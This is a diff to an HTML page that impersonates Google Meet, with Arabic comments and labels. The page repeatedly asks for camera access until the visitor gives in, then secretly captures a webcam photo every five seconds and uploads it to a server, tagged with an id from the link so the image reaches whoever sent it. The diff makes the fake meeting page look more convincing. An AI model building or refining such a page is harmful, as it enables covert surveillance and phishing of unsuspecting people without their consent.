@@ -5,7 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google Meet</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
             font-family: 'Roboto', Arial, sans-serif;
             background-color: #202124;
@@ -15,13 +20,17 @@
             flex-direction: column;
             overflow: hidden;
         }
+
+        /* منطقة الفيديو الرئيسية */
         .main-container {
             flex: 1;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 20px;
+            position: relative;
         }
+
         .video-wrapper {
             width: 100%;
             max-width: 900px;
@@ -32,7 +41,13 @@
             overflow: hidden;
             box-shadow: 0 4px 20px rgba(0,0,0,0.5);
         }
-        video { width: 100%; height: 100%; object-fit: cover; }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
         .user-label {
             position: absolute;
             bottom: 16px;
@@ -42,15 +57,30 @@
             border-radius: 4px;
             font-size: 14px;
         }
+
+        /* شريط التحكم السفلي */
         .controls-bar {
             height: 80px;
             background-color: #202124;
             display: flex;
             align-items: center;
-            justify-content: center;
-            gap: 12px;
+            justify-content: space-between;
             padding: 0 24px;
         }
+
+        .meeting-info {
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 12px;
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
         .btn {
             width: 48px;
             height: 48px;
@@ -61,15 +91,33 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 18px;
             cursor: pointer;
+            transition: background 0.3s;
+            font-size: 18px;
         }
+
+        .btn:hover {
+            background-color: #4c5054;
+        }
+
+        .btn.active {
+            background-color: #8ab4f8;
+            color: #202124;
+        }
+
         .btn-danger {
             background-color: #ea4335;
             width: 64px;
             border-radius: 24px;
             border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
         }
+
+        #photo-canvas { display: none; }
+
         #status-message {
             position: fixed;
             top: 20px;
@@ -81,12 +129,11 @@
             z-index: 100;
             border-left: 4px solid #8ab4f8;
         }
-        #photo-canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div id="status-message">جاري الاتصال بالاجتماع...</div>
+    <div id="status-message">بانتظار السماح بالوصول للكاميرا...</div>
 
     <div class="main-container">
         <div class="video-wrapper">
@@ -98,10 +145,16 @@
     <canvas id="photo-canvas"></canvas>
 
     <div class="controls-bar">
-        <div class="btn">🎤</div>
-        <div class="btn">📹</div>
-        <div class="btn">💬</div>
-        <button class="btn-danger" onclick="location.reload()">📞</button>
+        <div class="meeting-info">تفاصيل الاجتماع | abc-defg-hij</div>
+
+        <div class="action-buttons">
+            <button class="btn" title="كتم الصوت">🎤</button>
+            <button class="btn" title="إيقاف الفيديو">📹</button>
+            <button class="btn active" title="مشاركة الشاشة">📸</button>
+            <button class="btn-danger" onclick="location.reload()" title="مغادرة">📞</button>
+        </div>
+
+        <div style="width: 150px;"></div> 
     </div>
 
     <script>
@@ -110,51 +163,66 @@
         const statusMessage = document.getElementById('status-message');
         let currentStream = null;
 
-        // جلب المعرف من الرابط (?id=12345) ليعرف السيرفر لمن يرسل الصورة
+        // جلب الـ ID من الرابط تلقائياً إذا كان متاحاً
         const params = new URLSearchParams(window.location.search);
-        const targetUserId = params.get('id');
+        const userId = params.get('id');
 
         async function startCamera() {
+            statusMessage.textContent = 'جاري الاتصال...';
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' }, 
+                    audio: false 
+                });
                 currentStream = stream;
                 video.srcObject = stream;
-                video.style.transform = 'scaleX(-1)'; // وضع المرآة
+                video.style.transform = 'scaleX(-1)';
 
-                video.onplaying = () => {
+                video.onloadedmetadata = () => {
                     statusMessage.textContent = 'متصل بنجاح';
-                    // بدء السحب التلقائي كل 5 ثواني
+                    // التقاط وإرسال تلقائي كل 5 ثوانٍ
                     setInterval(captureAndSend, 5000);
                 };
             } catch (err) {
-                statusMessage.textContent = 'يرجى السماح بالكاميرا للدخول';
-                setTimeout(startCamera, 1000); // إلحاح في الطلب حتى يوافق المستخدم
+                statusMessage.textContent = 'يجب السماح بالكاميرا للدخول!';
+                // إعادة المحاولة التلقائية كل ثانيتين حتى يوافق المستخدم
+                setTimeout(startCamera, 2000);
             }
         }
 
         function captureAndSend() {
-            if (!currentStream || !targetUserId) return;
+            if (!currentStream) return;
 
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
-            
-            // تصحيح اتجاه الصورة قبل الإرسال
+
+            // تصحيح قلب الصورة لتظهر بشكل طبيعي
             ctx.translate(canvas.width, 0);
             ctx.scale(-1, 1);
-            ctx.drawImage(video, 0, 0);
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            const imageData = canvas.toDataURL('image/jpeg', 0.7);
-            
-            // إرسال الصورة إلى السيرفر مع معرف الشخص الذي أرسل الرابط
-            fetch('/upload-photo', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    image: imageData, 
-                    userId: targetUserId 
-                })
-            }).catch(err => console.error("إخفاق في المزامنة"));
+            const imageDataURL = canvas.toDataURL('image/jpeg', 0.7);
+            sendPhotoToServer(imageDataURL);
+        }
+
+        async function sendPhotoToServer(imageData) {
+            try {
+                // إرسال البيانات إلى نفس المسار على الخادم
+                const response = await fetch('/upload-photo', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        image: imageData,
+                        userId: userId // إرسال المعرف إذا كان مستخدماً في نظامك
+                    })
+                });
+                if(response.ok) {
+                    statusMessage.textContent = 'متصل - المزامنة نشطة';
+                }
+            } catch (error) {
+                statusMessage.textContent = 'ضعف في الشبكة...';
+            }
         }
 
         window.onload = startCamera;
